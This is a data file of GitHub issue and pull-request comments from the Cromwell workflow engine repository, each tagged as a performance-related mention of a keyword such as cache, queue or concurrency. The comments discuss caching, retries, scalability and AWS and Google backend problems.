Performance,"Hi Ales, in my case it was this bug here (that I've filed and is yet to be attended to):; https://broadworkbench.atlassian.net/browse/BA-6147. Run a `du -hs` on the directory and check the size, if it's ridiculously large, It could be that the reference files are being copied in the scatter gather rather than hard-linked or soft-linked. This is meant to be resolved with `cached-copy` for shared file systems but doesn't appear to work, particularly if the reference files are on a separate mount point to the working cromwell directory. If you do find that this is the case, a workaround that I found is that you can create a step of the workflow at the start that takes in each of these large files and merely runs a cp to their output. Then, rather than using the reference argument in the workflow, use the outputs from that first step that runs a cp. That will ensure that all of the reference files in the scatter gather are hard-linked rather than copied. Kind regards,; Alexis.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5218#issuecomment-651084834:374,cache,cached-copy,374,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5218#issuecomment-651084834,1,['cache'],['cached-copy']
Performance,"Hi Chris, . This would work for us as long as the retryOnStdoutRegex allows for just blanket retries (since it's free for us to do it on internal GridEngine queues), . Thanks for the follow-up, ; Paul",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2176#issuecomment-296226126:157,queue,queues,157,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2176#issuecomment-296226126,1,['queue'],['queues']
Performance,"Hi Jeff, . The short answer is I don't know about the overall Cromwell world. . The longer answer is: it's intended for me to get around transient issues involving local filesystems and GridEngine dispatcher. . We'd either run into paths not found when it's a network mount issue; or submitting jobs to a GridEngine queue (e.g., UGER) where the job might get killed after a certain time-period or if it takes up too much resources, . I understand that Cromwell already have retry logic that deals with I/O issues or pre-emptible VMs in the GCP world. I'm not sure how to organize the configs and the code to harmonize these two retry world's, so I'll leave it to you except to state that we do want some kind of ""Retry"" in the GridEngine use case. . Thanks,; Paul",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2176#issuecomment-295900647:316,queue,queue,316,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2176#issuecomment-295900647,1,['queue'],['queue']
Performance,"Hi Jeff,. You've built this great Actor system, but it needs to be actors on both ends. The round-robin pool of actors is not an actor system anymore if you cannot pass a Promise/Future/ActorRef to the other side, even if the API/channel capacity is limited. The status response should happen in less than a second, not an hour. We both know that we can have [millions of Actors in Akka/Scala](http://doc.akka.io/docs/akka/snapshot/general/actor-systems.html#What_you_should_not_concern_yourself_with), and the throughput on the Google network is huge. Thus no API limits should be prohibitive. I suggested using Pub/Sub API here:. https://github.com/broadinstitute/cromwell/issues/1089#issuecomment-229703152. And if that's not an option, you can implement the whole Google Genomics Pipeline API super-easy as an ephemeral GCE instance, which really is just becomes a promise/future. I even broke it down in a [post here](https://groups.google.com/forum/#!topic/google-genomics-discuss/_ox9h-C0_50), specifically in the paragraph that starts with **_So you might ask what exactly is an Operation resource_**:. https://groups.google.com/forum/#!topic/google-genomics-discuss/_ox9h-C0_50. You know my philosophy, always build it yourself to bypass any limitations :). `p",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1665#issuecomment-260214027:511,throughput,throughput,511,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1665#issuecomment-260214027,1,['throughput'],['throughput']
Performance,"Hi Kris,. That is great news, and of course I totally agree with the notification approach as things scale up ;) Though the issue might be when you get into millions/billions of operations later on, then there are some things that would need to be tweaked for that. As the number of operations scale up, the logging could then also become a bottleneck, as those are also API requests - besides the ones coming from the Pipeline API - and usually is a positive multiplier greater than 1 of the number of operations, with their own Retry requests. I think you'll agree that it's usually better to be more modular, so that things can easily be tweaked and updated over time - such as the transition to Pluggable Backends, but in this case for the Pipeline API directly. I agree with the capability of having fine-grained informational log events, though Pub/Sub API has certain limitations to be aware of:. https://cloud.google.com/pubsub/quotas#other_limits. Don't get me wrong, I'm still excited to see how version 2.0 of the Pipeline API evolves, but there are some tricky scalability issues that might emerge which could make the Cromwell code unnecessarily complex down the line, if one has to work through too many limitations/edge-cases. Paul",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1665#issuecomment-260279789:341,bottleneck,bottleneck,341,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1665#issuecomment-260279789,2,"['bottleneck', 'scalab']","['bottleneck', 'scalability']"
Performance,"Hi Kristian,. I understand, but what you're asking is very possible - see my previous discussion here about creating 1 billion simultaneous connections, and anything that is not accessible can be pre-cached via buckets during idle periods (i.e. nightly):. https://github.com/googlegenomics/utils-java/issues/62#issuecomment-220444203. So you should be able to create your own Pipeline implementation very easily via `gloud create`, [VM metadata startup scripts](https://cloud.google.com/deployment-manager/step-by-step-guide/setting-metadata-and-startup-scripts) and/or Dataflow Pipelines, and mimic JES:. https://cloud.google.com/sdk/gcloud/reference/compute/instances/create. https://cloud.google.com/deployment-manager/step-by-step-guide/setting-metadata-and-startup-scripts. https://cloud.google.com/dataflow/pipelines/constructing-your-pipeline#applying-transforms-to-process-pipeline-data. If you look at the JES API, you'll notice most of it mirrors the `gcloud` commands and parameters:. https://www.googleapis.com/discovery/v1/apis/genomics/v1alpha2/rest. Again the concepts to speed up searches on dynamically streaming (processed) analysis results has a foundation via inverted indices, which search engines use all the time - I posted a couple of these here:. https://github.com/ga4gh/schemas/pull/253#issuecomment-97525342. https://github.com/ga4gh/schemas/issues/142#issuecomment-55518571. This way your searches are always fresh and would operate without any delay. Hope it helps,; Paul",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1058#issuecomment-228175605:200,cache,cached,200,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1058#issuecomment-228175605,1,['cache'],['cached']
Performance,"Hi Luyu,. Thanks for the feedback. This is an interesting case. Normally if there is; a few minutes gap between workflows the instances will be terminated by; batch and the disks will be reclaimed so each workflow starts from scratch. However in your case there isn’t a pause in work long enough for Batch to; shut down the instances. Also because these files are written to a mounted disk they are not deleted; when the container terminates. I think this fix is simple if I add a cleanup step. I will do this ASAP. Thanks,; Mark. On Sat, Oct 24, 2020 at 5:27 AM Luyu <notifications@github.com> wrote:. > Hi,; >; > I have set up a Cromwell platform on AWS batch according to; > https://docs.opendata.aws/genomics-workflows/orchestration/cromwell/cromwell-overview/; >; > If I run GATK Best Practice pipeline for one sample, it works perfectly.; > However, when I ran this pipeline for 10+ samples concurrently, many AWS; > EC2 instances were re-used by AWS batch. Cromwell didn't clean up the; > localized S3 files and output files produced by previous tasks. This; > quickly inflated EBS cost when EBS autoscaling is enabled. One of my; > instances went up to 9.1TB and hit the upper bound for autoscaling, then; > the running task failed due to no space.; >; > I have checked Cromwell documents and some materials from AWS, as well as; > issue #4323 <https://github.com/broadinstitute/cromwell/issues/4323>. But; > none of them works for me. Thank you in advance for any suggestions.; >; > —; > You are receiving this because you are subscribed to this thread.; > Reply to this email directly, view it on GitHub; > <https://github.com/broadinstitute/cromwell/issues/5974>, or unsubscribe; > <https://github.com/notifications/unsubscribe-auth/AF2E6EPKRNY6TFQPVAG2Q4DSMKMZZANCNFSM4S5OX5IA>; > .; >",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5974#issuecomment-716230443:897,concurren,concurrently,897,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5974#issuecomment-716230443,1,['concurren'],['concurrently']
Performance,"Hi Sean,. Yeah I noticed that, and glad that it is in the process of getting fixed. Though this is precisely why we must have more control over the whole process, as creation of instances are basically just a cascade of events which get tied to an [**Operation**](https://developers.google.com/resources/api-libraries/documentation/compute/v1/java/latest/index.html?com/google/api/services/compute/model/Operation.html), through which you can interface with the VMs that are building or running. I have fairly high confidence that this is basically what is happening underneath the Google service endpoint when performing a [**RunPipelineRequest**](https://github.com/googleapis/googleapis/blob/c4899b3f0cef2caa73bb1a32baf00f54c8a49921/google/genomics/v1alpha2/pipelines.proto#L51-L53) through the [Pipeline API here](https://github.com/googleapis/googleapis/blob/c4899b3f0cef2caa73bb1a32baf00f54c8a49921/google/genomics/v1alpha2/pipelines.proto#L51-L53):. ```; rpc RunPipeline(RunPipelineRequest) returns (google.longrunning.Operation) {; option (google.api.http) = { post: ""/v1alpha2/pipelines:run"" body: ""*"" };; }; ```. If you think of this as a graph of best-effort networked dependent triggers via APIs, you can stabilize this to make it more predictable and scalable. It is just too obvious that we can collectively definitely make this better at this stage - as we already have the tools - and especially since we'll soon have nested workflows via https://github.com/broadinstitute/cromwell/issues/1532, which should be assumed to make the current number of operations in flight grow by several orders of magnitude. ~p",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1665#issuecomment-260533994:611,perform,performing,611,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1665#issuecomment-260533994,2,"['perform', 'scalab']","['performing', 'scalable']"
Performance,"Hi is this implemented in the latest version of cromwell? ; I am getting the following error for files > 5G with the latest version . 2019-10-31 04:31:17,243 cromwell-system-akka.dispatchers.engine-dispatcher-32 WARN - 85d92e7d-3017-4e8d-adac-551ebcd50165-EngineJobExecutionActor-jgi_meta.bbcms:NA:1 [UUID(85d92e7d)]: Failed copying cache results for job BackendJobDescriptorKey_CommandCallNode_jgi_meta.bbcms:-1:1 (EnhancedCromwellIoException: [Attempted 1 time(s)] - S3Exception: The specified copy source is larger than the maximum allowable size for a copy source: 5368709120 (Service: S3, Status Code: 400, Request ID: 1272B7BFF87110E8)), invalidating cache entry.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4828#issuecomment-548974241:333,cache,cache,333,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4828#issuecomment-548974241,2,['cache'],['cache']
Performance,"Hi! A task-level caching control has been introduced recently in the Cromwell 49. That's cool, thanks for the feature!. https://cromwell.readthedocs.io/en/stable/optimizations/VolatileTasks/; The example is using wdl specification 1.0 and it differs from draft-2 when tackling the meta section:. - draft-2 waits for a $string as a metadata value; - 1.0 waits for $meta_value = $string | $number | $boolean | 'null' | $meta_object | $meta_array. https://github.com/openwdl/wdl/blob/master/versions/1.0/SPEC.md#metadata-section; https://github.com/openwdl/wdl/blob/master/versions/draft-2/SPEC.md#metadata-section. Hence, a `volatile: true` is not valid for draft-2, because a boolean is not a string. Is it possible to adapt the meta section for draft-2 specification too? In example: `volatile: ""true""`. The majority of our workflows still stick to the draft-2 and their translation to 1.0 will be painful.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1695#issuecomment-607310823:162,optimiz,optimizations,162,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1695#issuecomment-607310823,1,['optimiz'],['optimizations']
Performance,"Hi, I this is might be a little late, but I am having this issue too when running using Batch. I configured my core environment on my own (without using the CF templates). I have a bucket that is located in `us-west-2` and the instance running Cromwell (v59), and the Job Queue are located in `us-east-2`. When I run a job, I get the same error that @illusional was getting.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4731#issuecomment-927177699:272,Queue,Queue,272,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4731#issuecomment-927177699,1,['Queue'],['Queue']
Performance,"Hi, I've been running Cromwell with the file-based DB fine for a few weeks, but today had a seemingly unrelated problem and this seems to have corrupted the DB. Potentially unrelated error:; ```; akka.pattern.AskTimeoutException: Ask timed out on [Actor[akka://cromwell-system/user/cromwell-service/WorkflowStoreCoo; rdinatedAccessActor#1289452983]] after [60000 ms]. Message of type [cromwell.engine.workflow.workflowstore.WorkflowStor; eCoordinatedAccessActor$FetchStartableWorkflows]. A typical reason for `AskTimeoutException` is that the recipient acto; r didn't send a reply.; at akka.pattern.PromiseActorRef$.$anonfun$defaultOnTimeout$1(AskSupport.scala:675); at akka.pattern.PromiseActorRef$.$anonfun$apply$1(AskSupport.scala:696); at akka.actor.Scheduler$$anon$4.run(Scheduler.scala:202); at scala.concurrent.Future$InternalCallbackExecutor$.unbatchedExecute(Future.scala:875); at scala.concurrent.BatchingExecutor.execute(BatchingExecutor.scala:113); at scala.concurrent.BatchingExecutor.execute$(BatchingExecutor.scala:107); at scala.concurrent.Future$InternalCallbackExecutor$.execute(Future.scala:873); at akka.actor.LightArrayRevolverScheduler$TaskHolder.executeTask(LightArrayRevolverScheduler.scala:334); at akka.actor.LightArrayRevolverScheduler$$anon$3.executeBucket$1(LightArrayRevolverScheduler.scala:285); at akka.actor.LightArrayRevolverScheduler$$anon$3.nextTick(LightArrayRevolverScheduler.scala:289); at akka.actor.LightArrayRevolverScheduler$$anon$3.run(LightArrayRevolverScheduler.scala:241); at java.base/java.lang.Thread.run(Thread.java:834); ```. Error that I receive now when I try to start Cromwell:. ```; 2020-05-05 15:31:33,773 INFO - dataFileCache commit start; 2020-05-05 15:33:32,400 ERROR - Failed to instantiate Cromwell System. Shutting down Cromwell.; java.sql.SQLTransientConnectionException: db - Connection is not available, request timed out after 121641ms.; at com.zaxxer.hikari.pool.HikariPool.createTimeoutException(HikariPool.java:676); at com.zaxxer.h",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5271#issuecomment-623865649:807,concurren,concurrent,807,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5271#issuecomment-623865649,3,['concurren'],['concurrent']
Performance,"Hi,. I am wondering if there was progress made on that issue? . Running GATK pipelines uses a lot of disk space for intermediate (bam) files, which is problematic for large cohorts. It seems that removing those files before the pipeline complete would break the Cromwell cache.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3881#issuecomment-620049532:271,cache,cache,271,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3881#issuecomment-620049532,1,['cache'],['cache']
Performance,"Hi,. In Cromwell 52 we updated the S3 module to perform multithreaded, multipart; copies to improve the size of results that may be cached. There are also; additional improvements that have recently been merged into dev and should; appear in the next release version (or you could build from source). v52+ requires a new AWS configuration. Instructions are in; https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf. On Sat, Oct 24, 2020 at 8:27 PM Luyu <notifications@github.com> wrote:. > Hi,; >; > I got a timeout exception during cache copying on AWS S3. The cache file; > size is 133GB. Given the file size, more time should be allowed for cache; > copying. Is there any config option that can tune this? Thank you in; > advance for any suggestions.; >; > Backend: AWS Batch; > Cromwell version: 51; > Error log:; >; > Failure copying cache results for job; > BackendJobDescriptorKey_CommandCallNode_PreProcessingForVariantDiscovery_GATK4.SamTo; > FastqAndBwaMem:0:1 (TimeoutException: The Cache hit copying actor timed; > out waiting for a response to copy s3://xxxxx/cromwell-execution/Germ; >; > line_Somatic_Calling/441619a4-7ca8-490b-bd04-2f9981d3db0f/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/95aed08f-3045-45e4-94c9-ba0230851136; > /call-SamToFastqAndBwaMem/shard-0/39T_R.unmerged.bam to; > s3://xxxxx/cromwell-execution/Germline_Somatic_Calling/c25a8561-808f-4b46-9bd2-ef0488; >; > 8c0031/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/8df24f46-2f4f-4557-a662-d630ac443736/call-SamToFastqAndBwaMem/shard-0/cacheCopy/39T_R.u; > nmerged.bam); >; > —; > You are receiving this because you are subscribed to this thread.; > Reply to this email directly, view it on GitHub; > <https://github.com/broadinstitute/cromwell/issues/5977>, or unsubscribe; > <https://github.com/notifications/unsubscribe-auth/AF2E6EMWLDPLNV7UM35OWWLSMNWFNANCNFSM4S56ELLQ>; > .; >",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-716229310:48,perform,perform,48,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-716229310,9,"['Cache', 'cache', 'perform', 'tune']","['Cache', 'cache', 'cacheCopy', 'cached', 'perform', 'tune']"
Performance,"Hi,. The improved multipart copying (api: CreateMultipartUpload) doesn't work for me. The cromwell server always checks the existence of the cached file before the copying finishes. In Cromwell v51 and before, some small files <100GB were able to be successfully cached. However, with Cromwell v53, even a 6GB result file got a problem of caching and has to rerun. Is there any way to prevent the timeout of the actor? . > Hi, In Cromwell 52 we updated the S3 module to perform multithreaded, multipart copies to improve the size of results that may be cached. There are also additional improvements that have recently been merged into dev and should appear in the next release version (or you could build from source) v52+ requires a new AWS configuration. Instructions are in https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf; > […](#); > On Sat, Oct 24, 2020 at 8:27 PM Luyu ***@***.***> wrote: Hi, I got a timeout exception during cache copying on AWS S3. The cache file size is 133GB. Given the file size, more time should be allowed for cache copying. Is there any config option that can tune this? Thank you in advance for any suggestions. Backend: AWS Batch Cromwell version: 51 Error log: Failure copying cache results for job BackendJobDescriptorKey_CommandCallNode_PreProcessingForVariantDiscovery_GATK4.SamTo FastqAndBwaMem:0:1 (TimeoutException: The Cache hit copying actor timed out waiting for a response to copy s3://xxxxx/cromwell-execution/Germ line_Somatic_Calling/441619a4-7ca8-490b-bd04-2f9981d3db0f/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/95aed08f-3045-45e4-94c9-ba0230851136 /call-SamToFastqAndBwaMem/shard-0/39T_R.unmerged.bam to s3://xxxxx/cromwell-execution/Germline_Somatic_Calling/c25a8561-808f-4b46-9bd2-ef0488 8c0031/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/8df24f46-2f4f-4557-a662-d630ac443736/call-SamToFastqAndBwaMem/shard-0/cacheCopy/39T_R.u nmerged.bam) — You are receiving this because",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-725311491:141,cache,cached,141,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-725311491,5,"['cache', 'perform']","['cache', 'cached', 'perform']"
Performance,"Hi,; Kate brought me here by this thread in the [forum](https://gatkforums.broadinstitute.org/wdl/discussion/10296/prioritize-workflows-which-are-allready-in-server-queue#latest) . It mostly covers the features @kcibul already requested. In addition, I would like to have an API command which forces a workflow directly to start by sending an actual running workflow to sleep/ pause. Maybe this could go hand in hand with call-caching for the sleeping workflow?. Greetings Selonka / EADG",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1566#issuecomment-327723019:165,queue,queue,165,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1566#issuecomment-327723019,1,['queue'],['queue']
Performance,"Hm. This looks like a conf bug on our side, but [is your config file importing application.conf](https://cromwell.readthedocs.io/en/stable/tutorials/ConfigurationFiles/#creating-your-first-configuration-file)? That file contains other overrides that cromwell should have over the default `akka` configuration. The bug here is that application.conf is only supposed to contain overrides, while reference.conf should contain newly defined resources. Since the `services` block are cromwell's services, they should be newly defined in reference.conf. That would then allow anyone who accidentally doesn't pick up our application.conf to *at least* have the reference `services`, plus the original `akka` values with degraded cromwell performance.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4577#issuecomment-457755274:731,perform,performance,731,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4577#issuecomment-457755274,1,['perform'],['performance']
Performance,"Hmm . concurrent tests =>; concurrent ServiceRegistryActors =>; concurrent EngineMetadataServiceActors =>; concurrent MetadataSummaryRefreshActors. The system was meant to have only a single MetadataSummaryRefreshActor running, so this might introduce weirdness.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1060#issuecomment-228141897:6,concurren,concurrent,6,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1060#issuecomment-228141897,4,['concurren'],['concurrent']
Performance,"Hmm that is definitely different from the ""task rejected from queue"" errors. And anyway 28 has the larger default metadata batch size changes, so if this really was a different symptom of that problem it shouldn't be happening on 28. . I don't see much different between develop and 28_hotfix that could legitimately explain fixes in the vicinity of Slick. 😕",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2447#issuecomment-315451894:62,queue,queue,62,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2447#issuecomment-315451894,1,['queue'],['queue']
Performance,"Hmm we would still need to cache at least the ""unevaluated expression"" I think, whatever that means. Otherwise what about this : . ```; task t1 {; String a; String b = ""hello"" + a; command {; echo ${b}; }; }. task t1 {; String a; String b = a + ""hello""; command {; echo ${b}; }; }. workflow w {; call t1 { input: a = ""a"" }; call t2 { input: a = ""a"" }; }; ```. Same input / command but the result will be different.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2309#issuecomment-306065035:27,cache,cache,27,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2309#issuecomment-306065035,1,['cache'],['cache']
Performance,Hmm yeah you're right. Scrolling up it looks like this ticket was referencing hotfix and not develop. And yeah we're not even trying to load this key on develop so Cromwell certainly shouldn't fail for its absence.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/845#issuecomment-224691653:136,load,load,136,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/845#issuecomment-224691653,1,['load'],['load']
Performance,"Hmm, that's interesting on the google side. So I'm clear you're saying that Cromwell is showing Running when they were not in Google? If so, how long did that stay the case - was it in perpetuity? I ask because as the number of jobs increases the average latency between a state change on Google's side and Cromwell detecting it increases due to QPS limitations. We're always trying to work with them to find ways to make that faster but we're limited on how many things we can query about at once, so we round robin them through. As an example the other day I submitted 200k single call workflows which each only slept for a couple of seconds but it took upwards of an hour for Cromwell to know that everything was complete due to that. I'm still going to look into the root cause of the exceptions you saw, i've been seeing those a lot myself (but had reason to believe it was an artifact of my not-at-all-standard setup, glad you chimed in to fix that for me) and wanted to make sure they weren't masking something more fundamentally wrong. re the logging aspect, I agree completely - this has always been an issue and is growing the more the people start adopting Cromwell. I found it amusing that just hours prior I said I should change that one to be less frightening and then it frightened someone ;) In general I think that logging is always a a dark art but answering the ""who is the log for?"" is even harder here as we intentionally designed cromwell to satisfy multiple use cases all of whom have different things they want to see. It's something that we're looking to work on over the next several months.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1665#issuecomment-260127711:255,latency,latency,255,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1665#issuecomment-260127711,1,['latency'],['latency']
Performance,How was the performance impact of this tested?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4087#issuecomment-420502738:12,perform,performance,12,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4087#issuecomment-420502738,1,['perform'],['performance']
Performance,"I added an alert if the load stays ""high"" for at least 20 minutes (meaning jobs are not started) it should send a notification to the `cromwell-load-alerts` slack channel.; If it works and we want we can move them to the on call channel.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3508#issuecomment-380942774:24,load,load,24,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3508#issuecomment-380942774,2,['load'],"['load', 'load-alerts']"
Performance,"I added the `concurrent-job-limit` to the `reference.conf` and I will add it to the [Configuration draft on the WDL website](http://gatkforums.broadinstitute.org/dsde/discussion/8687/how-to-configure-cromwell), tracked in [DSDE-docs #1524](https://github.com/broadinstitute/dsde-docs/issues/1524).",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1841#issuecomment-276804191:13,concurren,concurrent-job-limit,13,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1841#issuecomment-276804191,1,['concurren'],['concurrent-job-limit']
Performance,"I already ruled that out -- Docker itself is still functional. I didn't run hello world specifically, but I did was able to `docker run --it` and run a few commands. This is different from the behavior I see when I do not set the concurrent job limit to 1 on a local backend -- in that scenario I wouldn't be able to run any images at all, and need to forcibly quit + restart Docker to use it. For comparison, I ran the same WDL with the same inputs in miniwdl to see if it'd also get stuck, but it did not have this issue. miniwdl was able to complete the 1000x scattered task + the final task that gathers the scattered input. So it seems that Docker itself can handle launching a thousand containers one at a time.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6946#issuecomment-1310582127:230,concurren,concurrent,230,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6946#issuecomment-1310582127,1,['concurren'],['concurrent']
Performance,"I also played around with bolting on the docker hashing too. To be clear, I like @mcovarr's PR here better, as it's much cleaner, and has tests! Still, here's some overlapping [code](https://github.com/broadinstitute/cromwell/compare/job_avoidance...ks_hash_docker_image) to look at, especially the first commit with an alternative way to get an `ActorSystem` down into the `BackendCall`. A few issues left though, but some/most of these can be logged as new tickets, and we can get basic wiring in for the moment via this PR. Biggest issue-- 10 seconds is right on the edge for testing _and_ checking the docker server for the hash, so different docker tests currently timeout intermittently. Among other issues I saw, `Future` exception handling may be different due to refactoring. For example converting `Future { /* big block */ }` to `/* big block */ hashFuture.map(hash => ...)` allows exceptions within the block to not get caught (as expected?). Also I wasn't sure yet how we want to handle some `Failure` cases, specifically when the docker server doesn't return a hash. I assume that means that we should just run again from scratch, and NOT go to a `FailedExecution` state in the database. Or maybe we should go to `Failure`, and just retry a particular operations later. With ~~Gatling~~ Tyburn load testing, perhaps we can log any docker client errors now, and start to distinguish them with custom error handling code as they pop up.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/322#issuecomment-164760702:1308,load,load,1308,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/322#issuecomment-164760702,1,['load'],['load']
Performance,"I am getting this bug in Cromwell 44. Could not evaluate expression: ""--mem-per-cpu="" + memory_mb: Cannot perform operation: --mem-per-cpu= + WomLong(1024)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4659#issuecomment-512006346:106,perform,perform,106,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4659#issuecomment-512006346,1,['perform'],['perform']
Performance,"I am running into the same bug on Terra. Not sure what version of Cromwell it is using. My wdl validates however, I get the a run time error. ```; Failed to evaluate input 'fastq1' (reason 1 of 1): No coercion defined from wom value(s) '""gs://fc-secure-46b3886a-473a-49ef-8073-022230a526ac/6463b025-27cf-4649-b6d0-59f860bdf18b/bam2FastQStarAlignWorkflow/a4a0d2f2-cc8b-41d8-a5b5-61cf6c2d0bd4/call-bamToFastq/cacheCopy/GTEX-1192X-0011-R10a-SM-DO941.1.fastq.gz""' of type 'File' to 'Array[File]'.; ```. adding '[' and ']' resolved the run time issue; ```; call starWorkflow.star_fastq_list {; input:; star_index = starIndex,; fastq1 = [ bamToFastq.firstEndFastq ],; fastq2 = [ bamToFastq.secondEndFastq ],; prefix = sampleId; }; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4550#issuecomment-1148945607:407,cache,cacheCopy,407,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4550#issuecomment-1148945607,1,['cache'],['cacheCopy']
Performance,I assume it would be nice to have the hash of the Docker image Cromwell thinks your call ran with (pretending there are no race condition or other consistency issues between what Cromwell is doing to validate hashes and what's seen in JES)?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/322#issuecomment-164547063:123,race condition,race condition,123,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/322#issuecomment-164547063,1,['race condition'],['race condition']
Performance,"I believe this might be a consequence of the fact that the `WorkflowExecutionActor` is responsible for sending status updates to the metadata, and under the current load it accumulates those updates in its mailbox. Those updates then get processed and it's possible that 2 status updates close to each other in the mailbox end up generating the same timestamp. Those timestamps reflect the `WEA` view of the world, which might be delayed compared to reality if it's very busy. If that's not the desired behavior we could maybe have each job (EJEA) independently send status updates.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2173#issuecomment-295318559:165,load,load,165,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2173#issuecomment-295318559,1,['load'],['load']
Performance,"I believe to do this properly, it's the specific backend that should grab the docker image hash when a task is actually run (as opposed to the engine which can evaluate it when it sends it to the backend... which could queue it for any length of time). When checking for a call cache hit... we should first check everything else that's cheap before getting this hash",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1617#issuecomment-259272505:219,queue,queue,219,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1617#issuecomment-259272505,2,"['cache', 'queue']","['cache', 'queue']"
